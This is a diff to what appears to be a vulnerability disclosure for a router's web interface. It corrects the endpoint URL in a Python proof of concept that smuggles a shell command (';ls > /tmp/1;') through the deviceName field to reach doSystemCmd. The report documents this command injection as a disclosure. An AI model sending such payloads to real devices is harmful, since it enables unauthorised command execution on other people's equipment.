@@ -24,7 +24,7 @@ get value from deviceName ,then call doSystemCmd, can execute arbitrary command.
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formsetUsbUnload"
+url = "http://192.168.1.13/goform/setUsbUnload"
 payload = ';ls > /tmp/1;'
 
 r = requests.post(url, data={'deviceName': payload})
